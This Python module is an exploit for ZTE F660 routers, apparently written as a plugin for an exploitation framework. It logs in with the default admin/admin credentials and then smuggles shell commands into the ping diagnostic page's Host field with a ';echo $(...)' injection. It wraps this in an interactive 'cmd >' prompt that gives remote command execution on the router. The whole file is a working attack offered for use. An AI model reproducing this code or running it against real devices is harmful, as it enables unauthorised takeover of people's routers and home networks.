#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re
import requests
import time

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'ZTE F660 Remote Command Execute With Credits',
        'description': 'ZTE F660 Router allow remote command execute with credits'
                       '(Notice: Chinese version has another page needs no credits, details in zte.f460_f660_rce',
        'reference': [],
    }

    prompt = 'f660_rce_with_auth'

    def __init__(self):
        super().__init__()
        self.check_url = "http://{}:{}/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch"
        self.command = ';echo $({})'
        self.post_data = {"Host": "",
                          "NumofRepeat": 3,
                          "DataBlockSize": 64,
                          "PingAck": "",
                          "MinimumResponseTime": 0,
                          "MaximumResponseTime": 0,
                          "AverageResponseTime": 0,
                          "SuccessCount": 3,
                          "FailureCount": 0,
                          "DiagnosticsState": "Requested",
                          "DSCP": 0,
                          "Interface": "",
                          "Timeout": 2000,
                          "IF_ACTION": "new",
                          "IF_ERRORSTR": "SUCC",
                          "IF_ERRORPARAM": "SUCC",
                          "IF_ERRORTYPE": -1,
                          "IF_TIME": "NULL",
                          "IF_IDLE": "submit",
                          }
        self.result_data = {'Host': '',
                            "NumofRepeat": 3,
                            "DataBlockSize": 64,
                            "PingAck": "",
                            "MinimumResponseTime": 0,
                            "MaximumResponseTime": 0,
                            "AverageResponseTime": 0,
                            "SuccessCount": "",
                            "FailureCount": "",
                            "DiagnosticsStat": "Requested",
                            "DSCP": 0,
                            "Interface": "",
                            "Timeout": 2000,
                            "IF_ACTION": "refresh",
                            "IF_ERRORSTR": "SUCC",
                            "IF_ERRORPARAM": "SUCC",
                            "IF_ERRORTYPE": -1,
                            "IF_TIME": 4,
                            "IF_IDLE": "submit"
                            }
        self.username = 'admin'
        self.password = 'admin'
        self.s = requests.Session()

    def check(self, host, port, timeout):
        if self.username == '' or self.password == '':
            self.username = input('Username: ')
            self.password = input('Password: ')
            return self.check(host, port, timeout)
        else:
            utils.print_info('Use username: {}, password: {}'.format(self.username, self.password))
            user_input = input('Continue(Y/N):')
            if user_input.lower() == 'y' or user_input.lower() == 'yes':
                if self.login(host, port, timeout):
                    url = self.check_url.format(host, port)
                    resp, err = self.http_get(self.s, url, timeout)
                    if err:
                        self.print_requests_err(host, port, err)
                        self.print_check_result(False, host)
                    else:
                        textarea_1_match = re.compile(r'textarea cols="" rows="" class="textarea_1"', re.S).search(resp.text)
                        if textarea_1_match:
                            self.print_check_result(True, host)
                            return True
                        else:
                            utils.print_warning('Device is busy, please wait')
                            return False
                else:
                    utils.print_failed('Login failed')
                    self.print_check_result(False, host)
                    return False
            else:
                self.username = ''
                self.password = ''

            return False

    def run(self, host, port, timeout):
        if self.username == '' or self.password == '':
            self.username = input('Username: ')
            self.password = input('Password: ')
            self.run(host, port, timeout)
        else:
            utils.print_info('Use username: {}, password: {}'.format(self.username, self.password))
            user_input = input('Continue(Y/N):')
            if user_input.lower() == 'y' or user_input.lower() == 'yes':
                if self.login(host, port, timeout):
                    resp, err = self.http_get(self.s, self.check_url.format(host, port), timeout)
                    if err:
                        self.print_requests_err(host, port, err)
                    else:
                        while True:
                            cmd = input("cmd > ")
                            if cmd in ['exit', 'quit']:
                                return

                            response = self.execute(host, port, timeout, cmd)
                            utils.print_info(response)

                else:
                    utils.print_failed('Login failed')
            else:
                self.username = ''
                self.password = ''

    def execute(self, host, port, timeout, cmd):
        self.post_data['Host'] = self.command.format(cmd)
        self.result_data['Host'] = self.command.format(cmd)
        self.check_url = self.check_url.format(host, port)
        resp, err = self.http_post(self.s, self.check_url, timeout, self.post_data)
        if err:
            utils.print_warning(err)

        time.sleep(5)

        resp, err = self.http_post(self.s, self.check_url, timeout, self.result_data)
        if err:
            self.print_requests_err(host, port, err)
            return ''
        res_match = re.compile(r'textarea_1">(.*?)</textarea>', re.S).search(resp.text)
        if res_match:
            return res_match.group(1)
        else:
            return ''
            # res1_match = re.compile(r'textarea_1">(.*)', re.S).search(resp.text)
            # if res1_match and res1_match.group(1) == "-c 1 -s 64":
            #     return ""
            # else:
            #     res2_match = re.compile(r'(.*) -c', re.S).search(resp.text)
            #     res_match = res1_match + res2_match
            #     if res_match[0] != "</textarea>":
            #         return res_match[0]

    def login(self, host, port, timeout):
        url = 'http://{}:{}/'.format(host, port)
        resp, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            return False

        utils.print_info('"Retrieving random login token..."')
        frm_logintoken_reg = re.compile(r'Frm_Logintoken"\)\.value = "(.*)";')
        token_match = frm_logintoken_reg.search(resp.text)
        if token_match:
            token = token_match.group(1)
            utils.print_info(
                "Trying to log in with credentials {} : {}".format(self.username, self.password))
            url = 'http://{}:{}/'.format(host, port)
            data = {"Frm_Logintoken": token,
                    "Username": self.username,
                    "Password": self.password,
                    "action": "login"}
            resp, err = self.http_post(self.s, url, timeout, data)
            if err:
                utils.print_warning('{}:{} request error, msg: {}'.format(host, port, type(err).__name__))
                return False
            if "Username" not in resp.text and "Password" not in resp.text:
                utils.print_success("Successful authentication")
                return True
            else:
                return False
        else:
            utils.print_warning('Can not find the login token')
            return False
